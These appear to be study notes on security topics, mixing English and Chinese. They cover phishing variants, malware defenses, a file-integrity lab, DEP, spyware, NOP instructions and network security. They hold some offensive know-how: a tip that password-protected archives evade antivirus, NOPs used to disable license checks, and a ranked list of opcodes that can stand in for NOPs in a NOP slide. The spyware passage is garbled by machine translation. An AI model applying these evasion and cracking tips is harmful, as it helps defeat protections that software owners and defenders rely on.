The CEO and anyone else in the company can sign their emails with a digital signature.
 This provides a high level of certainty to personnel on who sent the email.
Whaling
nothing more than phishing or spear phishing, but for big users. target high-level executives.
the whaler identifies one person who can gain all of the data they want, a manager or owner, and targets the phishing campaign at them.
Example:
attackers singled out as many as 20,000 senior corporate executives in a fine- tuned phishing attack.
The emails looked like official subpoenas requiring the recipient to appear before a federal grand jury, included the executive’s full name and other details,
The emails also included a link for more details about the subpoena.
If clicked the link, it took them to a web site that indicated they needed a browser
add-on to read the document.
If they approved this install, they actually installed a keylogger and malware.   - Keylogger: recorded all keystrokes to a file,   - Malware: gave the attackers remote access to the executives’ systems.
Although not as common, some whaling attacks attempt to reach the executive via phone to get the data. However, many executives have assistants who screen calls to prevent attackers from reaching the executive via phone.
Pharming
Similar in nature to e-mail phishing,
pharming seeks to obtain personal information by domain spoofing.
  - e-mail phishing: been spammed with malicious e-mail requests for you to visit spoof Web sites which appear egitimate.
  - scam people one at a time with an e-mail
  - Pharming: 'poisons' a DNS server, infuse false information into the DNS
server, resulting in a user's request being redirected elsewhere.
  - allows the scammers to target large groups of people at one time
through domain spoofing.
Your browser, however will show you are at the correct Web site, which makes pharming more difficult to detect. Vishing
combine phishing with Voice over IP (VoIP)
Although crank calls have been in existence since the invention of the telephone
VoIP now makes it possible for someone to call you from almost anywhere in the world without worrying about tracing, caller ID, and other landline-related features.
Impersonation
involves any act of pretending to be someone you are not.
This can be a service technician, a pizza delivery driver, a security guard, or anyone else who might be allowed unfettered access to the grounds, network, or system.
Impersonation can be done in person, over the phone, by email, and so forth.
Blocking Malware and Other Attacks
The previous sections described several different methods attackers and criminals use to launch new attacks. However, organizations and individuals can prevent many of these attacks from succeeding with just a few steps.
These steps include using anti-malware software and educating users.
Protecting Systems from Malware
Malware is a significant threat for any organization. Administrators commonly implement layered security, or a defense-in-depth plan, to protect against malware. some common security controls to against malware:
Spam filter on mail gateways
  - Phishing delivered as malicious spam.
  - Spam filters on mail gateways / servers: detect and filter spam before
it ever gets to users.
  - Some networks route email through another device first to filter out
spam.
Anti-malware software on mail gateways.
  - Malicious email often includes malware as attachments.
  - Anti-malware software on the mail server can detect and block it.
  - The software strips potentially malicious attachments off the email,
and typically sends a notification to the user explaining what was removed and why.
All systems:
  - All workstations and servers have anti-malware software installed.
  - Servers may have additional, specialized anti- malware software installed depending on the applications running on the servers.
Boundaries or firewalls:
  - Many networks include detection tools that monitor network traffic through the firewall.
  - example, unified threat management (UTM) inspects network traffic to reduce the risk of malware entering the network.
Antivirus and Anti-Malware Software
- Most antivirus software detects, blocks, and removes several different types of malware, such as viruses, Trojans, worms, rootkits, spyware, and adware.
- Antivirus software provides real-time protection and can perform both scheduled and manual scans.
- The real-time protection: continuously monitors the system.
  - visits a web site, antivirus software scans the downloaded web site
files and attempts to block malicious code.
  - downloads or opens a file, antivirus software scansit before opening it. - Scheduled scans: occur regularly, such as once a week. If users or technicians detect suspicious activity, they can perform manual scans to check the system.
防毒軟體的偵測方式: (1)Scanning:掃特徵(signature) (2)Integrity Checking:檢查系統檔案完整性 (3)Interception:監控有寫入硬碟的行為 (4)Code Emulation:靜態分析(漏報多) (5)Heuristic Analysis:動態分析(誤報多)
壓縮檔設密碼即可阻止防毒軟體偵測。
Antivirus software detects viruses using either signature-based detection or heuristic- based detection.
Signature-Based Detection
Viruses and other malware have known patterns.
  - Signature files (data definition files) define the patterns, and the
antivirus software scans files for matching patterns.
When the software identifies a matching pattern, it reports it as an infection and takes action, like deleting or quarantining the file.
  - A quarantined virus is not harmful to the system while it is in quarantine, but it’s still available for analysis.
  - Example
  - release a quarantined virus into an unprotected but isolated virtual
machine environment for research and study. Malware developers constantly release new viruses, so it’s important to update signature definition files regularly.
Automate checking and downloading updated signature definition files. check for updates several times a day.
download and install signature files manually. When do not have Internet access.
  - Important to ensure the signature file has not lost data integrity by comparing the hash of the signature file posted on the antivirus vendor’s web site with the hash of the downloaded file.
Heuristic-Based Detection
to detect viruses previously unknown and do not have signatures, like zero-day exploits
Heuristic-based analysis:
  - runs questionable code in a sandbox or virtualized environment specifically designed to protect the live environment, while it observes the code’s behavior.
  - Most viruses engage in viral activities—actions that can be harmful, but are rarely performed by legitimateprograms.
  - The heuristic-based analysis detects these viral activities. Example:
polymorphic malware adds variations to files when it creates copies. It’s highly unusual for any application to add variations in files like this,
heuristic methods are often successful at detecting polymorphic malware. Checking File Integrity system files.
- File integrity checker:
  - calculates hashes on system files as a baseline.
  - It then periodically recalculates the hashes on these files and compares
them with the hashes in the baseline.
  - If the hashes are ever different, it indicates the system files have been modified.
  - When an antivirus scanner detects a modified file, it sends an alert.
  - Many times, these alerts can detect rootkit infections.
- It’s also possible to check file integrity with command-line tools.
  - Example:
  - Microsoft File Checksum Integrity Verifier (fciv.exe) tool
  - can verify the integrity of all files within a folder, or a group of nested folders.
  - The fciv.exe allows you to create a data file listing all the hashes for files within a directory.
  - run the command later to verify the hashes are the same.
  - Normally, message indicating the files haven’t lost integrity: “All files
verified successfully.”
  - if the app detects a file has a different hash, you’ll see a message similar to this:
  - List of modified files:
  - -----------------------
  - exefiles\md5Sum.exe
  - Hash is: 08ab4b9b40448d77079f61751f989702bbebe2ed   - It should be: 7648ec1a2d8c8b65a024973d30b4b2dc48ad0cec
  - indicates that the file md5sum.exe has been modified.
  - Executable files aren’t normally modified, the file has likely been infected with malware and it shouldn’t be used.
Setup The Lab
1. Create a folder Labs.
2. Within this folder, create another folder exefiles.
3. Copy the fciv.exe application file into the Labs folder. 4. Copy some files into the Labs\exefiles folder.
Example: md5sum.exe sha1sum.exe sha1sum.dll  Store the Hashes in an XML File
1. Open command line with admin permissions. 2. Change the directory: cd \labs
3. Calculate and view the SHA1 hashes in the exefiles folder: fciv -sha1 exefiles\
 fciv -sha1 exefiles\ -xml db.xml
The first time you run the command it gives this error “Error loading XML document” because the document doesn’t exist. However, it creates the document so you can ignore the error.
view the contents of the db.xml file: type db.xml
 Verify the Integrity of the Files
1. check the integrity by comparing the current hash with the hashes stored in the db.xml file:
fciv -v -sha1 -xml db.xml
Note that this command looks at the file names in the db.xml file so you don’t need to specify the folder. It then calculates the hashes for each of these files and compares the calculated hash with the stored hash. A key message here is:
All files verified successfully
2. Change the names of two of the files, renaming each to the name of the other file. example, I have the following two files in my directory.
md5sum.exe
sha1sum.exe
renamed md5sum.exe to sha1sum.exe. renamed sha1sum.exe to md5sum.exe.
3. Rerun the verification command:
fciv -v -sha1 -xml db.xml
List of modified files:
———————–
exefiles\md5Sum.exe
Hash is : 08ab4b9b40448d77079f61751f989702bbebe2ed
 It should be : 7648ec1a2d8c8b65a024973d30b4b2dc48ad0cec
exefiles\sha1sum.exe
Hash is : 7648ec1a2d8c8b65a024973d30b4b2dc48ad0cec
It should be : 08ab4b9b40448d77079f61751f989702bbebe2ed
This indicates that the files (md5sum.exe and sha1sum.exe) have been modified.
Executable files are rarely modified, so it indicates that the files might have been infected with malware and they should not be trusted.
Data Execution Prevention
Data execution prevention (DEP)
a security feature
prevents code from executing in memory regions marked as nonexecutable.
  - prevent an application or service from executing code from a nonexecutable memory region.
The primary purpose of DEP is to protect a system from malware. enforced by both hardware and software.
  - AdvancedMicroDevices (AMD) implement DEP using the no- execute page-protection (NX) feature.
  - Intel implements DEP using the Execute Disable Bit (XD) feature.
  - Both are enabled in the Basic Input/Output System (BIOS) or Unified
Extensible Firmware Interface (UEFI).
  - Within Windows, DEP is enabled in the System Properties – Performance Settings.
If DEP is not enabled in the BIOS or UEFI, but you try to install Windows, you will typically see an error message such as “Your PC’s CPU isn’t compatible with Windows.” The solution is to enable DEP in BIOS or the UEFI.
Advanced Malware Tools
Many vendors have begun developing advanced malware tools.
These go beyond just examining files to determine if they are malware.
example,
Cisco’s Advanced Malware Protection (AMP)
  - combines multiple technologies to protect a network before an attack, during an attack, and after an attack.
AMP
analyzes a network to prevent attacks using threat intelligence and analytics.
  - collects worldwide threat intelligence from Cisco’s Security Intelligence organization, Talos Security Intelligence and Research Group, and Threat Grid intelligence feeds.
  - This information helps it detect and alert on malware similar to any antivirus software.
During an attack, AMP uses a variety of techniques to detect and block emerging threats before they infiltrate a network, or contain and remediate malware that gets into a network.
AMP uses continuous analysis to detect suspicious file and network activity within a network, which helps it detect malware operating within the network.
Security administrators view logs and alerts to analyze and interpret the output from advanced malware tools such as AMP.   - Example
  - administrators see an alert indicating that encrypted data is being sent
out of the network.
  - This is a serious red flag and indicates malware is collecting data and sending it to an attacker.
Spam Filters
Organizations often implement a multipronged 多方面的 approach to block spam. Example
many UTM systems include spam filters to detect and block spam.
  - The output of the UTM goes to an email server.
Email servers also have methods of detecting and blocking spam.
  - The email server sends all email to the users, except for what it detects as spam.
User systems also have anti-spam filters, junk mail options, as a final check.
challenge of spam filter: only filter out spam, and never filter out actual email
Example
company wouldn’t want a spam filter to filter out an email from a customer trying to buy something.
Because of this, most spam filters err on the side of caution, allowing spam through rather than potentially marking valid email as spam. Although the science behind spam filtering continues to improve, criminals have also continued to adapt.
Spam filters typically allow you to identify email addresses as safe, or to be blocked.
You can add these as individual addresses or entire domains.
example
identify homer@ springfield.com as a safe email address.
designate springfield.com as a safe domain.
Similarly, you can block either the single email address homer@springfield.com or the entire domain springfield.com.
Educating Users
Untrained users provide a significant risk to any organization
are often one of the largest vulnerabilities.
They don’t need to be malicious insiders. They can simply be unaware of the risks.
No matter how much money an organization is spending on technology, it can all be bypassed by a single user clicking on a malicious link in an email. can be the infection of an entire network.
best protection against attacks: to train and raise the security awareness of users. raising users’ security awareness helps them recognize and respond appropriately
to new threats and security trends.
Security-related awareness and training programs take many forms.
Some common methods: formal classes, short informal live training sessions, online courses, posters, newsletters, logon banners, and periodic emails.
keep users aware of new threats and security trends and alerts, such as new malware, current phishing attacks, and zero-day exploits.
    4.4 Privacy-Invasive Software
Another category of malware is privacy-invasive software. This class of malicious software targets a user’s privacy or information that a user considers sensitive or valuable.
Consent and Intent
Privacy-invasive software can be installed on a user’s computer as a result of her visiting a certain web site or as a payload inside a computer virus, network worm, or Trojan horse email attachment. The software invades a user’s computer to either operate in the background performing privacy- invasive actions against the user’s consent or to immediately gather sensi- tive or valuable information against the user’s wishes.
The intent behind privacy-invasive software is usually commercial. The agent who launched it could, example, be interested in generating revenue from pop-up advertisements. He could alternatively be interested in stealing information about a user that he can resell to interested parties, or he may have a direct commercial interest in the privacy-invasive action the software is engaging in. In any case, the privacy violations performed by such malware are rarely merely for the sake of curiosity or vandalism.
4.4.2 Spyware
Spyware:
privacy-invasive software
installed on a user’s computer without his consent and which gathers information about a user, his computer, or his computer usage without his consent.
typically involve the use of one or more programs that are always running in the background, collecting information.
Periodically, these programs will contact a data collection agent and upload information it has gathered from the user. (See Figure 11.)
In order to continue running even after a computer has been rebooted, such an infection will often involve creating modifications in the OS so that the spyware software is always run as a part of the computer’s startup sequence.
A user typically doesn’t know that his computer is infected with spyware. His only indication may be that his computer might run a little more slowly, but such a performance degradation usually only occurs if a computer has multiple infections.
Naturally, a spyware infection will do whatever it can to hide its existence from a computer user, possibly using rootkit hiding tricks (recall Section 3.3). A spyware infection might even go to the length of removing competing adware and spyware, so as to make it harder for a user to notice that unwanted software is running.
Spyware can be categorized by the actions it performs
 Spyware is a type of malicious software (malware) that automatically installs itself on your computer and work as spies on kegitana performed by the user
and Internet activity without the knowledge and consent of the user’s
computer. Spyware capture and store all information from users such as keyboard keystrokes, email addresses, passwords, websites visited, and even data stored on the hard drive and sends to the server location gives a chance or who have previously addressed.Spyware remains hidden and will not be detected from the protection of security or security program your computer and will cause harm to the cause and spread the infection to other computers.
Spyware usually comes and installed into a number of free software.
  Symptoms of Spyware Infection
Spyware when entering your computer in the form of pop-ups that are not desirable from foreign sites, additional toolbars, software which has a function and is useful as an additional software; lead to changes in computer settings, setting the home page settings, or web pages that you usually surfing, or slow Internet connection or hinder the overall performance of your computer by consuming resources and inviting other infections.
Spyware Threat Is Big?
Yes very true. Spyware is one of the biggest threats in the world of computers and the Internet. Because Spyware capture and record all the information that you type or berbagikan via computer or the internet, basically making your computing security at risk by sending information to the client in question.Who knows what he’s doing with the personal and confidential information that was stolen from you. He may use it to send fake emails to family, friends, office, etc., sent to your bank to transfer money to another account, or demand ransom among other illegal kind. Sometimes, there is also a marketing company that captures user activity internet or using spyware to market their products.
Why Can not I Detect Antivirus Spyware?
Spyware works secretly and hidden, so it still would not be detected by antivirus or other security programs you have installed on your computer. You will not know about the existence of spyware unless you experience the common symptoms mentioned above.
How can I be protected from Spyware attacks?
If you previously had installed Antispyware then chances are your computer has been well protected. However, if you still find a spyware has penetrated into your computer, then the first thing you can do is update antivirus or anti-spyware program and run a full system scan. Antivirus or anti-spyware will automatically remove any threats that the results of the scan. If you do not have anti-spyware, please download from trusted sites. You can select different versions available free or paid like Spybot Search and Destroy, AdAware, Malwarebytes Anti Malware, Microsoft Security
Essentials, Windows Defender (Microsoft), Kaspersky, Norton, and Panda. This must be done to keep your computer and get the update from your computer security software.
Seek help from technical assistance computer or software vendor
               Yes, please contact technical support service providers online to get your computer ▪


##  clean from Spyware attacks. If you do not subscribe to any company, you can choose from a wide range of online spyware removal or virus removal support services that can clean your computer completely without having to reach into money in your pocket. Manual procedures are not recommended for users because it requires a thorough knowledge of technical aspects as well as patience. Therefore, it is recommended that users take help of expert technical support services online to save time and money.
promiscuous mode
Promiscuous mode refers to the special mode of
Ethernet hardware, in particular network interface cards (NICs), that allows a NIC to receive all traffic on the network, even if it is not addressed to this NIC.
  - a network card to be put into promiscuous mode, The card can view all traffic moving past it rather than just the traffic destined for it
  - The configuration allows a wired or wireless network interface controller to pass all traffic it receives to the central processing unit (CPU), rather than passing only the frames that the controller is intended to receive.
By default, a NIC ignores all traffic that is not addressed
to it, comparing the destination address of the Ethernet packet with the hardware address (MAC) of the device.
non-promiscuous mode makes it difficult to use network
monitoring and analysis software for diagnosing connectivity issues or traffic accounting.
   ▪


## Web Parameter Tampering attack
based on the manipulation of parameters exchanged
between client and server in order to modify application data, such as user credentials and permissions, price and quantity of products, etC.
Usually, this information is stored in cookies, hidden form fields, or URL Query Strings, and is used to increase
application functionality and control. Example:
  - bank's online servicing, URL bar: "http:// www.MyPersonalBank.com/account?id=368940911028389& Damount=10980&Camount=21"
  - modify the Damount & Camount values and submit the request
  - data on the web page reflect the changes. nop指令的作用:
1)就是通過nop指令的填充(nop指令一個字節)，使指 令按字對齊，從而減少取指令時的內存訪問次數。(一般 用來內存地址偶數對齊，比如有一條指令，佔3字節，這
   時候使用 nop 指令，cpu 就可以從第四個字節處讀取指令 了。)
2)通過nop指令產生一定的延遲，但是對於快速的CPU來 說效果不明顯，可以使用rep前綴，多延遲幾個時鐘;--> 具體應該說是佔用了3個時鐘脈衝! 3)i/o傳輸時，也會用一下 nop，等待緩衝區清空，總線 恢復;
4)清除由上一個算術邏輯指令設置的flag位; 5)破解:)對於原程序中驗證部分使用nop來填充，使驗 證失效; 6)有一個朋友說的比較厲害--在航天飛機控制程序中 防止程序跳飛! 解釋如下:在空間放射性環境下，放射性子粒很容易使內 存位元改變(呵呵，有點基因突變的感覺)，這樣如果改 變的是 jump，call 指令的存貯位置的話，就會導致程序跳 轉到一個不可以預置的位置，對於關鍵系統來說的確是災 難性的。所以就在被調用程序之前填充 nop 指令，這樣即 使跳轉到稍前或者稍後的位置，也不會造成影響。 這讓我想起《C Traps and Pitfalls》中舉的那個導彈軟件 中的致命錯誤:因爲導彈是以 0.1s 爲單位進行記時的，但 是由於浮點數沒有辦法精確的表示 0.1，造成了舍尾誤差， 這個誤差在導彈開啓 3 天的之後逐漸的積累，結果誤差了 一秒。
以下來自 http://wapedia.mobi/zh/NOP
計算機科學中，NOP 或 NOOP(No Operation 或
No Operation Performed的縮寫，意爲無操作)是彙編語 言的一個指令，一系列編程語句，或網絡傳輸協議中的表
 示不做任何有效操作的命令。
目錄:
1. NOP機器指令 2. NOP代碼
3. NOP協議命令 4. 破解
5. 安全問題
6. 參見
7. 參考文獻
1. NOP機器指令
有的計算機指令集包含一條指令，其主要目的是不改變任 何程序可訪問的寄存器，處理器狀態標誌或主存，而且可 能需要特定的時鐘週期來執行。在其它指令集中，NOP 是 用執行一條具有操作數，具有相同效果的指令來模擬的 (例如 SPARC 處理器推薦使用 sethi 0, %g0 模擬 NOP)。
NOP指令通常用於控制時序的目的，強制內存對齊，防止 流水線災難(en:Hazard (computer architecture))，佔據 分支指令造成的延遲(delay slot)，或是作爲佔位符以供 程序的改善(或替代被移除的指令)。在某些情況中， NOP指令會產生副作用;例如在摩托羅拉 68000處理器 中，NOP操作碼會產生流水線同步。
下表顯示了部分 CPU 架構上 NOP 指令的特徵:
CPU架構 助 字 操作碼 憶⻑
碼
備註 Intelx86 N 系列CPU O
P
Intel 805 N 1/O MCS-51 P 系列
1; i 686 中 爲 1-9
1
4 1
4
0x90; 0x0f 0x x86 CPU上的NOP指令
MIPS MOS科
技 65xx PowerPC
N O P
N O P
N O P
65C02處理器發佈時， 之前多數的無效指令都 被定義成了具有不同字 ⻑和需時的NOP指令。
2. NOP代碼
1f [2]
0x00
0x00000000 0xea
0x60000000 ( ori r0,r0,0的 擴展操作碼)
實質上是
XCHG EAX, EAX(操 作碼同爲0x90)--無任 何作用的指令。
NOP有時可以描述函數或一系列編程語句的作用，若部分 沒有作用(也可以稱爲冗餘代碼)。常見的編譯器優化的 作用就包括檢測和去除這樣的代碼。
下面是一個起 NOP 作用的 C 語言語句的例子(評判標準在 於語句是否影響程序輸出，而非編譯器是否爲語句產生代 碼): <source lang="C">
i+1; </source> (該語句執行了一個加法，但結果被丟棄。)
C語言中最簡單的NOP塊被稱爲空語句;其只包括一個分 號。(標準沒有要求編譯器在這個例子中生成NOP指令; 通常這個語句會直接爲編譯器所忽
略。) <source lang="C">
;
</source>
雖然空語句自身沒有用處，但在某些情況下可以啓動佔位 符的作用，例如在循環中: <source lang="C">
while (ReadChar() != '/n') ; </source>
以上代碼一直調用 ReadChar 函數，直到函數返回一個 /n (NL，新行)字符。
Python中的pass語句不會產生作用，可以作爲NOP使用。 它的主要目的是保證語法正確，由於Python的縮進敏感語 法。
3. NOP協議命令
許多協議，比如 telnet，包含 NOP 指令，該指令允許客戶 端可以在不會引起其它操作的情況下向服務器請求迴應。 NOP 指令可以用於檢測連接是否斷開，或服務器是否可以 響應操作。下列協議中包含 NOOP 指令(不完全列表):
· telnet · FTP
· SMTP · X11
· POP3 · NNTP · finger
· IMAP4
· BitTorrent
注意:與其它協議不同，IMAP4 的 NOP 命令允許客戶端響 應服務器發送由其它客戶端反應的操作信息。
雖然大多數 telnet 和 FTP 服務器用 OK 或 +OK 迴應 NOOP 指令，有的程序員在對客戶端的迴應中加入了特別的內 容。例如 MINIX 的 ftpd 守護進程會以以下消息迴應 NOOP:[3]
[[FTP服務器返回值列表|200]] NOOP to you too!
4. 破解
NOP通常在破解軟件時有特殊用途，例如檢查序列號，特 定硬件或軟件需求，加密狗等的軟件。這是通過更改函數 和/或子程序以跳過安全檢查，直接返回期望的檢測值實現 的。由於大多數安全檢查子程序中的指令會被廢棄，它們 會被NOP所代替。
5. 安全問題
NOP操作碼可以被用於組成一個NOP slide，允許在指令指 針值未定義時執行代碼，例如緩存溢出導致棧上的函數返 回地址被更改。
6. 參見
· 計算機系統結構
· HLT
· 指令集
· x86
· 恆等函數，函數式編程語言中NOOP的等效函數 · xyzzy，一個有時用來代替NOOP的命令 7. 參考文獻
1 ^ Motorola 68000 Programmer's Reference Manual.
2 ^ Intel Architecture Software Developer's Manual, Volu me 2: Instruction Set Reference Manual [2007-07-13].
16進制機器碼 x86彙編指令 指令意義 可能影響的寄存 器或標誌位
-------------- ------------- -------------------
---------------------------
06 PUSHL %es es進棧 esp
0E PUSHL %cs cs進棧 esp
16 PUSHL %ss ss進棧 esp
1E PUSHL %ds ds進棧 esp
27 DAA 加法小數位調整 AF CF PF SF ZF AL 2F DAS 減法小數位調整 AF CF PF SF ZF AL 37 AAA 加法的ASCII調整 AF CF AL
3F AAS 減法小數位調整 AF CF AL
40 INC %eax %eax加1 AF OF PF SF ZF eax 41 INC %ecx %ecx加1 AF OF PF SF ZF ecx 42 INC %edx %edx加1 AF OF PF SF ZF edx 43 INC %ebx %ebx加1 AF OF PF SF ZF ebx 44 INC %esp %esp加1 AF OF PF SF ZF esp 45 INC %ebp %ebp加1 AF OF PF SF ZF ebp 46 INC %esi %esi加1 AF OF PF SF ZF esi
47 INC %edi %edi加1 AF OF PF SF ZF edi 48 DEC %eax %eax減1 AF OF PF SF ZF eax 49 DEC %ecx %ecx減1 AF OF PF SF ZF ecx 4A DEC %edx %edx減1 AF OF PF SF ZF edx 4B DEC %ebx %ebx減1 AF OF PF SF ZF ebx 4C DEC %esp %esp減1 AF OF PF SF ZF esp 4D DEC %ebp %ebp減
1 AF OF PF SF ZF ebp
4E DEC %esi %esi減1 AF OF PF SF ZF esi 4F DEC %edi %edi減1 AF OF PF SF ZF edi 50 PUSHL %eax eax進棧 esp
51 PUSHL %ecx ecx進棧 esp
52 PUSHL %edx edx進棧 esp
53 PUSHL %ebx ebx進棧 esp
54 PUSHL %esp esp進棧 esp
55 PUSHL %ebp ebp進棧 esp
56 PUSHL %esi esi進棧 esp
57 PUSHL %edi edi進棧 esp
90 NOP (NULL) (NULL)
91 XCHG %ecx,%eax 交換寄存器內容 eax,ecx 92 XCHG %edx,%eax 交換寄存器內容 edx,eax 93 XCHG %ebx,%eax 交換寄存器內容 ebx,eax 95 XCHG %ebp,%eax 交換寄存器內容 ebp,eax 96 XCHG %esi,%eax 交換寄存器內容 esi,eax
97 XCHG %edi,%eax 交換寄存器內容 edi,eax
98 CBW 將byte的AL轉換成word的EAX EAX
9B WAIT 等待CPU處理完數據 (NULL)
D6 無效指令 (NULL) (NULL)
F5 CMC 轉換CF標誌位(開關) CF
F8 CLC 清CF位(CF=0) CF
F9 STC 設置CF位(CF=1) CF
FC CLD 設置DF位(DF=1) DF
FD STD 清理DF位(DF=0) DF 1. 上面利用XCHG/PUSHL/INC/DEC的方法程序應該不會 出錯, 可以正常到目的, 但寄存器內容被改變了.inc eax就 改變了eax的值, 只能算無奈的辦法.
2. 利用改變標誌寄存器位是個不錯的想法, 基本上不會 影響流程, 但看到還是改變了CPU的東⻄還是不滿意.
3. /x90(NOP),/x9b(wait),/xd6(bad) 這三個指令不錯, 都 不會改變程序的流程, 又不會改變寄存器的東東. 這裏尤其指明的是 /xd6 指令, 在 intel 手冊上沒查到對應什 麼指令, 但在 linux 下和 windows 下發現系統對於這個是繼 續
執行下一條指令,和 NOP 相似. 在我看來,上面這些指令利用順序優先級最好是:
/x90(NOP) > /xd6 > /x9b > 改變標誌寄存器的操作 指令 > INC/DEC/PUSHL/XCHG
還有 http://www.zhihu.com/question/21122634 Security Domains
- layered approach
◦ not relying on one single technology to secure your
information. - defense in depth
◦ multiple layers of technologies, or techniques, protecting access to our data. to back that up.
- least privilege approach
◦ access to your resources, or execution of tasks, is done with a
level of access only needed to access that resource, or to
execute that task.
◦ tight access controls
- logging
◦ able to answer what happened when, and who did it, and we
can do that with logging.
threats and risks
- external attacks
◦ Can you define who is a trusted user, and who isn't? How do
you keep the external, un-trusted people out, and still allow
access to your trusted users? - internal attacks
◦ Can an external actor gain physical access to your secure
networks, simply by walking into one of your facilities? Now, - rogue employees
◦ when an employee copies information to a disc, and simply
walks right out the door with it. How do you prevent this from
happening?
- malware and viruses
Both of these security domains have many things in common, but differ under implementation. The goal is to control access to information, and provide access where needed.
host based security
- securing access to a system with features, or security methods, provided by the programs installed or the operating system itself.
- physical security
- the host based firewall
◦ Firewalls filter traffic at the network layer. Eventually, those
packets have to be passed up into the operating system, for access. ◦ Many of the worms, or viruses could've been prevented by the most basic host based firewall.
◦ used a host based firewall, to restrict who can access those
services, and from where.
- TCP Wrappers
◦ defense at the server level, server process level,
◦ things like SSH, NFS, and others, can have an additional
security layer built in, that provides access control, and
logging.
- logging
◦ implement effective logging.
- SELinux
◦ an access-controlled system.
◦ It implements the concept of the principle of least privilege, for
users, programs, and services.
- user access
◦ defining the users. - File permissions
◦ use file permissions to define, at a very granular level, who can
access the data on our system.
- encryption
◦ leverage encryption at the operating system level,
◦ encrypt data files, only the users with the keys can gain access
to the data.
◦ encrypt data transmit to other systems, securely exchange
information with other systems.
network based security
- provides security services by controlling access to the network itself.
- By securing a network, we can provide a barrier, or a perimeter,
around the information resources, that we're trying to secure.
- physical security
- firewalls security zones.
◦ Basically, segmenting our systems, based on the level of
security needed.
◦ Network based firewalls also give us the ability to monitor
connection activity, and log that information persistently, for
auditing.
- DMZ
◦ a specific implementation of network firewalling, allow external
access to our internal resources on a logically, or physically segmented perimeter network, which is separate from our core information assets.
◦ This is most commonly used to allow access to information
resources, to the public Internet.
- encryption
◦ securing information at rest, on disc, and leveraging the operating system, securely transmit data between themselves.
◦ also leverage network resources to provide encryption of our
data streams,
- remote access
◦ use techniques, like encryption tunneling, with SSH tunnels, or
VPNs, allow remote users access to internal resources,
securely from other insecure networks.
- logging
◦ the ability to log information access, network access, and also, network access attempts, for further analysis.
firewall architectures.
- filtered host. This is where the operating system itself, is providing firewall services, securing the host, and preventing unauthorized access, to network services.
- Often, this host is given alpine access, but there is little-to-no inbound access to this system. This is an example of host based security.
- screened subnet. ◦ collection of systems. defense in depth strategy, each system on this subnet have a firewall running on the host.
◦ But, we can add an additional layer of security to all of the systems on this subnet, with a network based firewall.
◦ And we can set up what's called a network perimeter, and apply policies here.
◦ Now, that firewall can be connected to other networks, or even
the Internet. have policies set, to protect our network from the
nefarious hackers of the world.
◦ Normally, in this configuration, the firewall has very restrictive
policies on what can come in, from the Internet, if anything at all. This combination is an example of host based security, and network based security.
- DMZ.
◦ have our perimeter firewall, as we did with the screened
subnet. But, our LAN is secured, and no access is allowed into
that network.
◦ to provide access to a less secure network, where we can do
things, like place our publicly accessible resources, implement a less secure security zone, DMZ, and route unfiltered traffic to this network, and place hosts on this network, like web servers.
System Logging
- rsyslog - Rocket Fast System Log Processing
- provides you a way to route and store logging messages from
various components on system.
- The log sources that generate the messages, can come from
anything on your local system. security log, the colonel, mail
daemon, anything that can generate a log message.
- syslog maps the source to a log file destination.
- Now, this logging mechanism isn't restricted to logging to just a local
system. We can configure the system log as both a client, and a server. As a client, log messages can be packaged up, and sent to a remote system. Which remote system? Well, we configure our syslog as a server, too, so it could be set up to receive log messages from other hosts. Using this, you can build a centralized logging system for the hosts, and network resources, on your network. ### 5. Network Security Networks
Computer Networks
The Purpose of Networks: make connections.
- the true value of a network: the traffic flowing over those connections.
  - File sharing between two computers
  - Video chatting between computers located in different location
  - Surfing the web (example, to use social media sites, watch streaming
video, listen to an Internet radio station, or do research for a school
term paper)
  - Instant messaging (IM) between computers with IM software installed
  - E-mail
  - Voice over IP (VoIP), to replace traditional telephony systems
Converged network.
- a network transporting multiple types of traffic (example, voice, video, and
data)
- offer significant cost savings to organizations, previously supported separate
network infrastructures for data.
- This convergence can also potentially reduce staffing costs,
  - because only a single network needs to be maintained, rather than separate networks for separate traffic types.
Overview of Network Components
- Client: the device an end user uses to access a network.
  - workstation, laptop, smartphone with wireless capabilities, end-user
terminal devices.
- Server: serves up resources to a network. server, web pages as provided by a web server, or files available on a file server.
- Repeter: easier than hub. - Hub:
  - older technology that interconnects network components, such as clients and servers.
  - Hubs vary in their number of available ports.
  - interconnected, up to a point.
  - too many hubs, network errors can result.
  - hub does not perform any inspection of the traffic it passes.
  - simply receives traffic in a port (that is, a receptacle to which a
network cable connects) and repeats that traffic out all of the other ports.
- Switch:
  - interconnects network components, are available with a variety of port
densities 12-24-34.
  - a Layer 2 device, forward decisions based on Media Access Control
(MAC) address.
  - addresses physically burned into a network interface card
(NIC) installed in a host
  - take traffic in on one port, learns which devices reside off of which
ports.
  - interrogates the traffic its destined.
  - forwards the traffic out of the appropriate port, and not out all of the
other ports.
  - cuts down on the volume of traffic coursing through your network.
  - 3 type switch: Core - distribution (different role) - access
- Router:
Media: ◆
  - ⁃
⁃
Layer 3 device
makes forwarding decisions based on logical network addresses. Internet Protocol (IP) addressing.
when traffic comes into a router, the router examines the destination IP address of the traffic and, based on the router’s database of networks (the routing table), the router intelligently forwards the traffic out the appropriate interface. ◆
  - copper cabling, fiber-optic cable, air(wireless networks)
For now, realize that media varies in its cost, bandwidth capacity, and distance limitation.
  - fiber-optic cabling
  - more expensive than unshielded twisted-pair cabling
  - carry traffic over longer distances and has a greater bandwidth
capacity (that is, the capacity to carry a higher data rate).
WAN link: wide-area network
- most networks connect to one or more other networks.
- example, if your company has two locations, and those two locations are interconnected (perhaps via a Frame Relay or Multiprotocol Label Switching [MPLS] network)
Networks Geography
One criterion by which we can classify networks is how geographically dispersed the networks components are. example, a network might interconnect devices within an office, or a network might interconnect a database at a corporate headquarters location with a remote sales office located on the opposite side of the globe.
Based on the geographical dispersion: of network components, networks can be classified into various categories, including the following:
LAN: Local-area network (LAN)
- interconnects within a local region (like within a building). - Examples of common LAN technologies you’re likely to encounter include Ethernet (that is, IEEE 802.3) and wireless networks (that is, IEEE 802.11).
WAN: Wide-area network (WAN)
- interconnects network components that are geographically separated.
- example, a corporate headquarters might have multiple WAN connections to
remote office sites.
- Multiprotocol Label Switching (MPLS), Asynchronous Transfer Mode
(ATM), and Frame Relay are examples of WAN technologies. Other Categories of Networks
CAN: campus-area network
- The university covered several square miles and had several dozen buildings.
- Many of these buildings was LAN. By interconnecting these LANs, another
network type was created, CAN.
- Besides an university campus, might also be found in an industrial park or
business park.
MAN: metropolitan-area network (MAN)
- More widespread than a CAN and less widespread than a WAN
- a MAN interconnects locations scattered throughout a metropolitan area 大都
会的.
- Example
